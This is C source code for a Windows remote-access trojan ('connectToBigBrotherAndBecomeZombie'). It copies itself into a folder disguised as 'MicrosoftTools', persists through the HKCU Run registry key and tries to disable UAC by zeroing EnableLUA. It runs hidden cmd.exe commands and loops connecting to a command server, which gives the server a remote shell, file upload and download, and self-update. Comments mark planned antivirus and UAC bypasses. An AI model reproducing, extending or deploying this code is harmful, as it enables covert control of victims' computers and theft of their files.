#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "EA_Socket.h"
#include "EA_Process.h"

static void infectTheSystemItself(void);
static void connectToBigBrotherAndBecomeZombie(void);
static int process(int sckt, char * al);

int main()	// gcc --machine-windows
{
	WSADATA _wsdata;

	while (WSAStartup(MAKEWORD(2, 0), &_wsdata) != 0)
	{
		Sleep(500);
	}

	//TODO: ByPass AV
	//TODO: ByPass UAC

	infectTheSystemItself();
	connectToBigBrotherAndBecomeZombie();
	
	WSACleanup();

	return 0;
}

static void infectTheSystemItself(void)
{
	HKEY hKey;
	DWORD dwAttr;
	char command[400 + 1];
	char targetPath[MAX_PATH + 1];
	char srcPathwithName[MAX_PATH + 1];
	char targetPathwithName[MAX_PATH + 1];
	const char progName[] = "deneme.exe";

	GetModuleFileNameA(NULL, srcPathwithName, MAX_PATH);

	snprintf(targetPath, MAX_PATH, "%s\\MicrosoftTools", getenv("LOCALAPPDATA"));

	dwAttr = GetFileAttributesA(targetPath);

	if (dwAttr != 0xffffffff && (dwAttr & FILE_ATTRIBUTE_DIRECTORY))
	{
		if (strncmp(srcPathwithName, targetPath, strlen(targetPath)) != 0)
		{
			exit(0);
		}
		return;
	}

	snprintf(targetPathwithName, 400, "%s\\%s", targetPath, progName);

	snprintf(command, 400, "cmd.exe /c mkdir %s", targetPath);
	WinExec(command, SW_HIDE); Sleep(200);

	snprintf(command, 400, "cmd.exe /c copy %s %s", srcPathwithName, targetPathwithName);
	WinExec(command, SW_HIDE); Sleep(200);

	if(ERROR_SUCCESS == RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey))
	{
		RegSetValueExA(hKey, progName, 0, REG_SZ, (BYTE * )targetPathwithName, strlen(targetPathwithName));
	}

	RegCloseKey(hKey);

	// if the program is started without admin, lnRes will not be ERROR_SUCCESS.
	if(ERROR_SUCCESS == RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_WRITE, &hKey))
	{
		dwAttr = 0;
		RegSetValueExA(hKey, "EnableLUA", 0, REG_DWORD, (BYTE * )&dwAttr, sizeof(DWORD));
	}

	RegCloseKey(hKey);

	snprintf(command, 400, "cmd.exe /c start %s", targetPathwithName);
	WinExec(command, SW_HIDE); Sleep(200);

	exit(0);
}

static void connectToBigBrotherAndBecomeZombie(void)
{
	int sckt;
	char * al;
    int port = 5005;
    struct hostent * he;
	int de, check = 0, yes = 1;
	struct sockaddr_in veriler;
    struct in_addr ** addr_list;
    char host[] = "127.0.0.1";

	while((he = gethostbyname(host)) == NULL)
	{
		Sleep(1000);
	}

	addr_list = (struct in_addr **)he->h_addr_list;

	while (1)
	{
		sckt = socket(AF_INET, SOCK_STREAM, 0);

		if (sckt != SOCKET_ERROR)
		{
			setsockopt(sckt, SOL_SOCKET, SO_REUSEADDR, (char * )&yes, sizeof(int));

			veriler.sin_family = AF_INET;
			veriler.sin_port = htons(port);
			veriler.sin_addr.s_addr = inet_addr(inet_ntoa(*addr_list[0]));
			memset(veriler.sin_zero, 0, 8);

			while (1)
			{
				if((check = connect(sckt, (struct  sockaddr *)&veriler, sizeof(veriler))) != SOCKET_ERROR)
				{
					break;
				}

				Sleep(500);
			}

			while(1)
			{
				if ((al = recverText(sckt)) == NULL)
				{
					break;
				}

				if ((de = process(sckt, al)) != 0)
				{
					break;
				}

				free(al);
			}

			closesocket(sckt);
		}

		Sleep(1000);
	}
}

static int process(int sckt, char * al)
{
	if (strncmp(al, "cmd", 3) == 0)
	{
		processCMD(sckt);
	}
	else if (strncmp(al, "getFile ", 8) == 0)
	{
		processFileUpload(sckt, al + 8);
	}
	else if (strncmp(al, "sendFile ", 9) == 0)
	{
		processFileDownload(sckt, al + 9);
	}
	else if (strncmp(al, "update ", 7) == 0)
	{
		char command[400 + 1];
		char srcPathwithName[MAX_PATH + 1];

		WinExec("cmd.exe /c del old.exe", SW_HIDE); Sleep(200);
		GetModuleFileNameA(NULL, srcPathwithName, MAX_PATH);

		snprintf(command, 400, "cmd.exe /c rename %s old.exe", srcPathwithName);
		WinExec(command, SW_HIDE); Sleep(200);

		processFileDownload(sckt, al + 7);

		snprintf(command, 400, "cmd.exe /c move %s\\MicrosoftTools\\%s %s", getenv("LOCALAPPDATA"), al + 7, srcPathwithName);
		WinExec(command, SW_HIDE); Sleep(200);

		snprintf(command, 400, "cmd.exe /c start %s", srcPathwithName);
		WinExec(command, SW_HIDE); Sleep(200);

		exit(0);
	}

	return 0;
}
